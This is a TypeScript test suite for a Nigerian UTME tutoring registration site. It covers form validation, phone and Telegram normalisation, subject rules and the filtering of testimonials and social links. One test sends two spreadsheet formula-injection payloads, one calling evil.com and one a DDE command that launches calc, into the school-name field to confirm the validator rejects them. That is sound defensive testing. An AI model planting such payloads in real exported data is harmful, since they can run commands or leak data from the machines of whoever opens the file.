import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { REFERENCE_PLANS_OVERVIEW } from "../src/config/programme.ts";
import {
  getActiveSocialLinks,
  isValidOfficialSocialUrl,
} from "../src/config/social.ts";
import {
  normalizeTrackRecordMediaUrl,
  resolveTrackRecordData,
} from "../src/config/trackRecord.ts";
import {
  formatNaira,
  formatUtmeSubjectsLabel,
  normalizeTelegramUsername,
  normalizeWhatsAppNumber,
  validateRegistrationForm,
} from "../src/lib/validation.ts";
import type { RegistrationFormValues } from "../src/types/registration.ts";

function makeValidForm(
  overrides: Partial<RegistrationFormValues> = {}
): RegistrationFormValues {
  return {
    fullName: "Ọláwálé Chukwuemeka-Bello",
    whatsappNumber: "08012345678",
    telegramUsername: "@olawale_2027",
    email: "candidate@example.com",
    stateOfResidence: "Lagos",
    schoolName: "Government Model College",
    electiveSubjects: ["Mathematics", "Chemistry", "Physics"],
    planId: "plan-4m",
    privacyAcknowledged: true,
    honeypot: "",
    turnstileToken: "valid_turnstile_token_12345",
    ...overrides,
  };
}

describe("Registration Form Validation & Normalisation (REG-01..REG-11)", () => {
  it("accepts valid Nigerian candidate details including tonal diacritics and hyphens", () => {
    const res = validateRegistrationForm(makeValidForm(), {
      availablePlans: REFERENCE_PLANS_OVERVIEW,
      allowInternational: false,
      requireTurnstile: true,
    });
    assert.equal(res.isValid, true);
    assert.deepEqual(res.errors, {});
  });

  it("normalises Nigerian mobile formats to canonical E.164 (+234...)", () => {
    assert.equal(normalizeWhatsAppNumber("0801 234 5678").canonical, "+2348012345678");
    assert.equal(normalizeWhatsAppNumber("2349079255537").canonical, "+2349079255537");
    assert.equal(normalizeWhatsAppNumber("+23408123456789").canonical, "+2348123456789");
    assert.equal(normalizeWhatsAppNumber("080123").valid, false);
    assert.equal(normalizeWhatsAppNumber("+447911123456", false).valid, false);
    assert.equal(normalizeWhatsAppNumber("+447911123456", true).valid, true);
  });

  it("removes only a single leading @ from Telegram usernames (REG-03)", () => {
    assert.equal(normalizeTelegramUsername("@pacesetter27"), "pacesetter27");
    assert.equal(normalizeTelegramUsername("@@invalid_double"), "@invalid_double");

    const doubleAt = validateRegistrationForm(
      makeValidForm({ telegramUsername: "@@invalid_double" }),
      { availablePlans: REFERENCE_PLANS_OVERVIEW }
    );
    assert.equal(doubleAt.isValid, false);
    assert.ok(doubleAt.errors.telegramUsername);
  });

  it("enforces Science UTME subject rules: Use of English + 3 distinct Science electives (REG-07)", () => {
    const tooFew = validateRegistrationForm(
      makeValidForm({ electiveSubjects: ["Mathematics", "Biology"] }),
      { availablePlans: REFERENCE_PLANS_OVERVIEW }
    );
    assert.equal(tooFew.isValid, false);
    assert.ok(tooFew.errors.electiveSubjects);

    const emptySubjects = validateRegistrationForm(
      makeValidForm({ electiveSubjects: [] }),
      { availablePlans: REFERENCE_PLANS_OVERVIEW }
    );
    assert.equal(emptySubjects.isValid, false);
    assert.ok(emptySubjects.errors.electiveSubjects);

    const duplicates = validateRegistrationForm(
      makeValidForm({
        electiveSubjects: ["Mathematics", "Mathematics", "Physics"],
      }),
      { availablePlans: REFERENCE_PLANS_OVERVIEW }
    );
    assert.equal(duplicates.isValid, false);
    assert.ok(duplicates.errors.electiveSubjects);

    assert.equal(
      formatUtmeSubjectsLabel(["Physics", "Mathematics", "Chemistry"]),
      "Use of English, Mathematics, Chemistry, Physics"
    );
  });

  it("rejects unavailable plans, unacknowledged privacy notice, and missing Turnstile token", () => {
    const unavailablePlans = REFERENCE_PLANS_OVERVIEW.map((p) =>
      p.id === "plan-4m" ? { ...p, available: false } : p
    );
    const res = validateRegistrationForm(
      makeValidForm({ privacyAcknowledged: false, turnstileToken: "" }),
      {
        availablePlans: unavailablePlans,
        requireTurnstile: true,
      }
    );
    assert.equal(res.isValid, false);
    assert.ok(res.errors.planId);
    assert.ok(res.errors.privacyAcknowledged);
    assert.ok(res.errors.turnstileToken);
  });

  it("rejects formula injection symbols and invalid characters in school name", () => {
    const formulaPayload = validateRegistrationForm(
      makeValidForm({ schoolName: "=IMPORTXML(\"https://evil.com\", \"//a\")" }),
      { availablePlans: REFERENCE_PLANS_OVERVIEW }
    );
    assert.equal(formulaPayload.isValid, false);
    assert.ok(formulaPayload.errors.schoolName);

    const plusPayload = validateRegistrationForm(
      makeValidForm({ schoolName: "+cmd|' /C calc'!A0" }),
      { availablePlans: REFERENCE_PLANS_OVERVIEW }
    );
    assert.equal(plusPayload.isValid, false);
    assert.ok(plusPayload.errors.schoolName);
  });

  it("formats Naira amounts cleanly", () => {
    assert.equal(formatNaira(1500), "₦1,500");
    assert.equal(formatNaira(6000), "₦6,000");
  });
});

describe("Track Record & Official Social Links Safeguards", () => {
  it("defaults to empty records when no mock data is configured", () => {
    const resolved = resolveTrackRecordData();
    assert.deepEqual(resolved.scores, []);
    assert.equal(resolved.testimonials.length, 0);
    assert.equal(resolved.gallery.length, 0);
  });

  it("resolves verified scores and scholar testimonials when provided by server", () => {
    const resolved = resolveTrackRecordData({
      scores: [{ id: "score-1", score: 347, examYear: "2026", approved: true }],
      testimonials: [
        {
          id: "scholar-1",
          displayName: "Verified Scholar",
          score: 347,
          examYear: "2026",
          university: "University of Ibadan (UI)",
          course: "Medicine & Surgery",
          consentVerified: true,
          approved: true,
        },
      ],
    });
    assert.equal(resolved.scores.length, 1);
    assert.equal(resolved.scores[0]?.score, 347);
    assert.equal(resolved.testimonials.length, 1);
    assert.equal(resolved.testimonials[0]?.displayName, "Verified Scholar");
  });

  it("strictly filters out unconsented or unapproved reviews and normalises Google Drive share links", () => {
    assert.equal(
      normalizeTrackRecordMediaUrl(
        "https://drive.google.com/file/d/1AbCdEfGhIjKlMnOpQrStUvWxYz/view?usp=sharing"
      ),
      "https://lh3.googleusercontent.com/d/1AbCdEfGhIjKlMnOpQrStUvWxYz"
    );

    const resolved = resolveTrackRecordData({
      testimonials: [
        {
          id: "rev-unconsented",
          displayName: "Student A",
          reviewText: "Helpful tutorials.",
          consentVerified: false,
          approved: true,
        },
        {
          id: "rev-approved",
          displayName: "Student B",
          reviewText: "Consistent mock drills helped me stay sharp.",
          feedbackScreenshotUrl:
            "https://drive.google.com/file/d/1ValidDriveScreenshotId/view",
          consentVerified: true,
          approved: true,
        },
      ],
      gallery: [
        {
          id: "gal-unapproved",
          category: "UTME Result",
          title: "Unapproved Slip",
          imageUrl: "https://example.com/slip.jpg",
          caption: "Result slip",
          consentVerified: true,
          approved: false,
        },
      ],
    });

    assert.equal(resolved.testimonials.length, 1);
    assert.equal(resolved.testimonials[0]?.id, "rev-approved");
    assert.equal(
      resolved.testimonials[0]?.feedbackScreenshotUrl,
      "https://lh3.googleusercontent.com/d/1ValidDriveScreenshotId"
    );
    assert.equal(resolved.gallery.length, 0);
  });

  it("hides unconfirmed social platforms instead of rendering broken or dummy links", () => {
    assert.equal(isValidOfficialSocialUrl(""), false);
    assert.equal(isValidOfficialSocialUrl("#"), false);
    assert.equal(isValidOfficialSocialUrl("http://insecure.example.com"), false);

    const defaults = getActiveSocialLinks();
    assert.deepEqual(
      defaults.map((item) => item.key),
      ["whatsapp"]
    );

    const withTelegram = getActiveSocialLinks({
      telegram: "https://t.me/afograde_official",
      instagram: "",
    });
    assert.deepEqual(
      withTelegram.map((item) => item.key),
      ["whatsapp", "telegram"]
    );
  });
});
